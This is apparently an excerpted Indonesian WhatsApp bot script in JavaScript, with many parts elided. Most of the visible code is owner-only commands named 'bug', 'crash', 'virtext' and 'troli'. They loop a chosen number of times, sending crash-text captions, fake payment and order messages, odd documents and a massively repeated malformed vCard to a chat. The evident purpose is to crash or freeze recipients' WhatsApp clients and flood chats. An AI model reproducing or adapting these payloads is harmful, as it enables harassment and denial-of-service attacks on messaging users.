...
// Base © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ Hw Mods : Copyan Dari Base Dika

› Create By © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢
› Base Ori © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢
› Copyan Base Dika Hisoka Morou

🌷 KALAU MAU RENAME TARO CREDITS GUA : © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ */
...
//=================================================//
const reply = (teks) => {
return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })} 
//=================================================//
try {
...
break
case 'jadikatalog': case 'dilzkatalog': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
...
let teks = `${q}`
for (let i of teks) {
haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
...
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO 👋 SAYA BOT © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢",
"options": [
{
...
{
"optionName": "SALAM BROTHER BY © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢"
}
],
...
break
//=================================================//
case 'dilztroli2': case 'dilztrol': case 'jutrol': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
...
break
case 'dilztroli3': case 'dilztrol2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
...
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢`,
}
}}), { userJid: m.chat, quoted: doc})
...
haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
}
break
//=================================================//
case 'dilzdaca': case 'dilzdaca':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
for (let i = 0; i < jumlah; i++) {
 ...
 haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
 }
 }
 break
//=================================================//
case 'dilzdocu': case 'dilzdraknes':  {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
break
//=================================================//
case 'duc': case 'dilzslebew': case 'cumadocu': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
break
//=================================================//
case 'dilzvirtext1': case 'dilzzsu': case 'crashar1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${iphone}` }, { quoted: doc })
}
}
break
case 'dilzvirtext2': case 'dilztol': case 'crashar2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${iphone1}` }, { quoted: doc })
}
}
break
case 'dilzvirtext3': case 'dilzmemek': case 'crashar3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${iphone2}` }, { quoted: doc })
}
}
break
case 'dilzvirtext4': case 'dilzcontol': case 'crashar4': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${iphone3}` }, { quoted: doc })
}
}
break
case 'dilzvirtext5': case 'dilztextv': case 'crashar5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${iphone4}` }, { quoted: doc })
}
}
break
case 'dilzvirtext6': case 'dilzgas': case 'crashar6':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${iphone5}` }, { quoted: doc })
}
}
break
case 'dilzvirtext7': case 'dilzvirtext': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${iphone6}` }, { quoted: doc })
}
}
break
case 'dilzvirtext8': case 'dilzvirtext1': case 'crashar7':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${buttonkal}` }, { quoted: doc })
}
}
break
case 'dilzvirtext9': case 'dilzvirtext2': case 'crashar8':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${buttonvirus}` }, { quoted: doc })
}
}
break
case 'dilzvirtext10': case 'dilzvirtext3': case 'crashar9': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c869a46b8c5.jpg' }, caption: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${ngazap(prefix)}`}, { quoted: doc })
}
}
break
//=================================================//
case 'dilzbug1': case 'dilzcrash': case 'crashar10':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
break
//=================================================//
case 'dilzbug2': case 'dilzcrash1': case 'crashar11': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
"mimetype": "image/jpeg",
"caption": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
...
break
//=================================================//
case 'dilzbug3': case 'dilzcrash2': case 'crashar12': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
"fileName": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
...
break
//=================================================//
case 'dilzbug4': case 'dilzcrash3': case 'crashar13':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
"title": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
...
break
//=================================================//
case 'dilzbug5': case 'dilzcrash4': case 'crashar14': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
break
case 'dilzbug6': case 'dilzcrash5': case 'crashar15':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
break
//=================================================//
case 'dilzbug7': case 'dilzcrash6': case 'crashar16':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
"description": "Developer © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
...
break
//=================================================//
case 'dilzbug8': case 'dilzcrash7': case 'crashar17': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
"groupName": `MY NAME © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
"orderTitle": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
...
"title": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,
"description": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢`,
"currencyCode": "IDR",
"footerText": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ WE ARE NOT MASTOD`,
...
break
case '🌷': case 'crashmek': case 'ampunsuhu': case 'ahyangbetul': case 'okemek': case 'dilznih': case 'crashar18': case 'mexdemam': case 'dilz1': case 'dilz2': case 'dilz3': case 'dilz4': case 'dilz5': case 'dilz6': case 'dilz7': case 'dilz8': case 'dilz9': case 'dilz10': case 'dilz11': case 'dilz12': case 'dilz13': case 'dilz14': case 'dilz15': case 'dilz16': case 'dilz17': case 'dilz18': case 'dilz19': case 'dilz20': case 'dilz21': case 'dilz22': case 'dilz23': case 'dilz24': case 'dilz25': case 'dilz26': case 'dilz27': case 'dilz28':
case 'dilz29':
case 'dilz30':
case 'dilz31':
case 'dilz32':
...
break
//=================================================//
case 'dilzstik': case 'dilzkangbug': case 'buttonkematian': case 'crashar19': {
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
...
break
//=================================================//
case 'dilzbugie': case 'dilzkangbug1': case 'crashar20': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!text) throw `*Type some text*\n\nExample : ${prefix + command} dilzmods`
...
break
//=================================================//
case 'dilzbutton': case 'dilzkangbuttton': case 'testbutton': case 'inibutton': 
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
...
haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${ngazap(prefix)}.BIN`, title: `© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢ ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
}
break
//=================================================//
case 'dilztod': case 'dilzewe': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© © ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© ꪶ⸸⁶⁶⁶ꪶ⸸⁶⁶⁶dilz⁶⁶⁶⸸ꫂ͢⁶⁶⁶⸸ꫂ͢\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
...
break
//=================================================//
case 'dilzbokep': case 'dilzngentod': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
